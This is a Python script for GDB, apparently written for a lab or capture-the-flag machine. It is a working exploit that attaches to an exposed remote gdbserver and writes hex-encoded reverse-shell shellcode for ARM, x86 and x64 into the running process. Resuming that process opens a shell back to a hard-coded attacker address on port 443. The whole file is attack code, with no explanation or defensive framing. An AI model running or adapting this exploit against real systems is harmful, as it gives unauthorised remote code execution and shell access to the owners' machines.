import socket
import sys
import gdb
import socket
import struct
import  binascii

DEBUG = False

# IP Address and Port of gdbserver
RHOST = '10.129.108.74'
RPORT = 1337
#GDB_SERVER= ('10.129.108.74', 1337)

# IP Address and Port of reverse shell on local machine
LHOST = '10.10.16.19'
LPORT = 443
#IP = '10.10.16.19'
#PORT = 443

def print_output(fmt, *args):
    sys.stdout.write(fmt % args + '\n')
    gdb.flush(gdb.STDOUT)
    
def gen_reverse_shell(shellcode, ip, port):
    ip = socket.inet_aton(ip)
    port = struct.pack('>H',port)
    return binascii.unhexlify(shellcode).replace(b'\xff'*2, port).replace(b'\x00'*4, ip)

def reverse_shell_x86(ip, port):
    sc = '31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b06631dbb30268' \
         '000000006668ffff6653fec389e16a10515689e156cd805b31c9b103fec9b03f' \
         'cd8075f831c052686e2f7368682f2f626989e3525389e15289e2b00bcd80'
    return gen_reverse_shell(sc, ip, port)

def reverse_shell_x64(ip, port):
    sc = '4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f054989c0' \
         '4831f64d31d24152c604240266c7442402ffffc7442404000000004889e66a10' \
         '5a41505f6a2a580f054831f66a035e48ffce6a21580f0575f64831ff57575e5a' \
         '48bf2f2f62696e2f736848c1ef0857545f6a3b580f05'
    return gen_reverse_shell(sc, ip, port)

def reverse_shell_arm(ip, port):
    sc = '01108fe211ff2fe102200121921a0f02193701df061c08a11022023701df3f27' \
         '0221301c01df0139fbd505a0921a05b469460b2701dfc0460200ffff00000000' \
         '2f62696e2f736800'
    return gen_reverse_shell(sc, ip, port)

def get_shellcode(ip, port, arch):
    if arch == 'arm':
        shellcode = reverse_shell_arm(ip, port)
        return shellcode
    if arch == 'x86':
        shellcode = reverse_shell_x86(ip, port)
        return shellcode
    if arch == 'x64':
        shellcode = reverse_shell_x64(ip,port)
        return shellcode
        
def set_shellcode(ip, port, arch):
    shellcode = get_shellcode(ip, port, arch)
    for idx,ch in enumerate(shellcode):
        if arch == "arm":
            gdb.execute('set *(unsigned char *)($pc + %d) = %d' % (idx, ch))
        if arch == "x86":
            gdb.execute('set *(unsigned char *)($eip + %d) = %d' % (idx, ch))
        if arch == "x64":
            gdb.execute('set *(unsigned char *)($rip + %d) = %d' % (idx, ch))

def set_architecture(arch):
    if arch == "arm":
        gdb.execute('set architecture arm')
    if arch == 'x86':
        gdb.execute('set architecture i386')
    if arch == 'x64':
        gdb.execute('set architecture i386:x86-64')
        
        
def reverse_shell(ip, port, arch):
    set_architecture(arch)
    gdb.execute('target extended-remote {ipaddr}:{portnumber}'.format(ipaddr=RHOST, portnumber=RPORT))
    print_output("[+] Connected to {ipaddr}:{portnumber}".format(ipaddr=RHOST, portnumber=RPORT))
    bp = gdb.Breakpoint('*0', internal=True)
    print_output("[+] Installed Invalid Breakpoint")
    print_output("[+] Running")
    try:
        gdb.execute('run')
    except gdb.error as e:
        pass
    print_output("[+] Deleting Invalid Breakpoint")
    bp.delete()
    print_output("[+] Setting shellcode for {arch}".format(arch=arch))
    set_shellcode(ip, port, arch)
    print_output("[+] Reverse Shell created")
    try:
        gdb.execute('continue')
        gdb.execute('continue')
    except:
        pass

def reverse_shell_all_arch(ip, port):
    arch = ["arm", "x86", "x64"]
    for x in arch:
        print_output("[+] Testing {x} ...".format(x=x))
        try:
            reverse_shell(ip, port, x)
        except:
            print_output("[!] GDBServer not running on {x}!".format(x=x))
                
def main(ip, port):
    gdb.execute('set confirm off')
    gdb.execute('set verbose off') 
    reverse_shell_all_arch(ip, port)
    
if __name__ == '__main__':
    main(LHOST, LPORT)
